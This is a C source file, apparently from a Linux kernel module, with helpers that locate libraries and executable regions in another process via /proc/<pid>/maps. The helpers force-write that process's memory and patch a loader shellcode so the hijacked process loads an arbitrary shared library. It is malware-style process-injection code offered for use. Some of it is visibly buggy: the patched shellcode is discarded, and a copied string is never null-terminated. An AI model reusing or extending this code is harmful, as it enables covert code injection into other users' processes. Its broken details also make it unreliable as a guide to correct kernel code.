#include "utils.h"

#include <linux/mm.h>
#include <linux/sched/mm.h>
#include <linux/slab.h>
#include <linux/gfp.h>

#include "file.h"
#include "so_shellcode_loader.h"

void* find_lib_address(pid_t pid, char* library) {
  	struct file* fp;
	char filename[30];
	char data[850];
	char* line;
	unsigned long addr;
    int offset = 0;
	char* substring;
	int size = 0;
	sprintf(filename, "/proc/%d/maps", pid);
	fp = file_open(filename, O_RDONLY, 0);
	if(NULL == fp) {
		return NULL;
    }
	while(true) {
		size = file_read(fp, offset, data, 850);
		if (0 == size) {
			file_close(fp);
			return NULL;
		}
		substring = strstr(data, "\n");
		if (NULL == substring) {
			substring = data + size;
		}
		
		size = substring - data;
		line = kmalloc(size + 1, GFP_KERNEL);
		strncpy(line, data, size);
		sscanf(line, "%lx-%*x %*s %*s %*s %*d", &addr);
		if(strstr(line, library) != NULL) {
			kfree(line);
			break;
		}
		kfree(line);
        offset += size + 1;
	}
	file_close(fp);
	return (void*)addr;
}

void* find_executable_space(pid_t pid) {
	struct file* fp;
	char filename[30];
	char data[850];
	char* line;
	unsigned long addr;
	char str[20];
	char perms[5];
    int offset = 0;
	char* substring;
	int size = 0;
	sprintf(filename, "/proc/%d/maps", pid);
	fp = file_open(filename, O_RDONLY, 0);
	if(NULL == fp) {
		return NULL;
    }
	while(true) {
		size = file_read(fp, offset, data, 850);
		if (0 == size) {
			file_close(fp);
			return NULL;
		}
		substring = strstr(data, "\n");
		if (NULL == substring) {
			substring = data + size;
		}
		
		size = substring - data;
		line = kmalloc(size + 1, GFP_KERNEL);
		strncpy(line, data, size);
		sscanf(line, "%lx-%*x %s %*s %s %*d", &addr, perms, str);
		kfree(line);
		if(strstr(perms, "x") != NULL) {
			break;
		}
        offset += size + 1;
	}
	file_close(fp);
	return (void*)addr;
}

ssize_t mem_rw(struct task_struct *task, char *buf, size_t count, loff_t *ppos, int write) {
	struct mm_struct *mm = task->mm;
	unsigned long addr = *ppos;
	ssize_t copied;
	char *page;
	unsigned int flags;

	if (!mm)
		return 0;

	page = (char *)get_zeroed_page(GFP_KERNEL);
	if (!page)
		return -ENOMEM;

	copied = 0;
	if (!atomic_inc_not_zero(&mm->mm_users))
		goto free;

	/* Maybe we should limit FOLL_FORCE to actual ptrace users? */
	flags = FOLL_FORCE;
	if (write)
		flags |= FOLL_WRITE;

	while (count > 0) {
		int this_len = min_t(int, count, PAGE_SIZE);

		if (write && NULL == memcpy(page, buf, this_len)) {
			copied = -EFAULT;
			break;
		}

		this_len = access_process_vm(task, addr, page, this_len, flags);
		if (!this_len) {
			if (!copied)
				copied = -EIO;
			break;
		}

		if (!write && NULL == memcpy(buf, page, this_len)) {
			copied = -EFAULT;
			break;
		}

		buf += this_len;
		addr += this_len;
		copied += this_len;
		count -= this_len;
	}
	*ppos = addr;

	mmput(mm);
free:
	free_page((unsigned long) page);
	return copied;
}

ssize_t mem_read(struct task_struct* task, char *buf, size_t count, unsigned long pos) {
	loff_t ppos = pos;
	return mem_rw(task, buf, count, &ppos, 0);
}

ssize_t mem_write(struct task_struct* task, char *buf, size_t count, unsigned long pos) {
	loff_t ppos = pos;
	return mem_rw(task, buf, count, &ppos, 1);
}

void* get_shellcode(size_t* shellcode_size, struct pt_regs* registers, unsigned long so_library_name, unsigned long load_so_function) {
	void* shellcode_patched;
	*shellcode_size = (unsigned long)end_of_shellcode - (unsigned long)shellcode;
	if (0 >= *shellcode_size){
		return NULL;
	}
	shellcode_patched = kmalloc(*shellcode_size, GFP_KERNEL);
	memcpy(shellcode_patched, shellcode, *shellcode_size);
	memcpy(shellcode_patched + 16, (void*)&load_so_function, sizeof(unsigned long));
	memcpy(shellcode_patched + 26, (void*)&so_library_name, sizeof(unsigned long));
	memcpy(shellcode_patched + 58, (void*)&registers->ip, sizeof(unsigned long) / 2);
	memcpy(shellcode_patched + 63, (void*)&registers->ip + sizeof(unsigned long) / 2, sizeof(unsigned long) / 2);
	return shellcode;
}